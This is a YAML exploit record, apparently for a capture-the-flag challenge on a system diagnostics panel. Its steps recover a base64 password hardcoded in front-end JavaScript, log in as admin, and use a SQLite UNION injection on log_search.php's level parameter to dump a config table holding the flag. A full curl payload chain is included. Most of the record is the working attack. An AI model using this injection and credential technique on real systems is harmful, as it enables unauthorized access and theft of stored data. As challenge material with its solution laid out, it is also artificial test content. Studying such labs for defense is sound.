info:
  name: a-17-sysdiag-sqli-hardcoded-password
  cve: ''
  summary: 系统诊断面板：前端JS硬编码base64密码→登录→log_search.php?level=参数SQLite UNION注入读取config表获取flag
  severity: medium
  affected: ''
  references: []
poc:
  type: exploit
  principle: 系统诊断面板：前端JS硬编码base64密码→登录→log_search.php?level=参数SQLite UNION注入读取config表获取flag
  steps:
  - 1. GET login page, find js/login.js reference
  - 2. Read js/login.js, find hardcoded credentials in atob() call → decode base64
    to get password ADMIN12@123!
  - 3. Login with username=admin password=ADMIN12@123! using --data-urlencode for
    special chars (@ and !)
  - 4. Use new session cookie to access log_search.php with UNION injection on level
    param
  - '5. Dump config table via: level=zzz'' UNION SELECT id,name,value FROM config--'
  - 6. Flag found in config table value column
  payload: curl -sD- "http://TARGET/index.php" --data-urlencode 'username=admin' --data-urlencode
    'password=ADMIN12@123!' | grep 'Set-Cookie' | extract PHPSESSID; then curl -s
    -b "PHPSESSID=SESSION" "http://TARGET/log_search.php?level=zzz'%20UNION%20SELECT%20id,name,value%20FROM%20config--"
    | grep -oP '<td[^>]*>.*?</td>' | sed 's/<[^>]*>//g'
  verification: 系统诊断面板：前端JS硬编码base64密码→登录→log_search.php?level=参数SQLite UNION注入读取config表获取flag
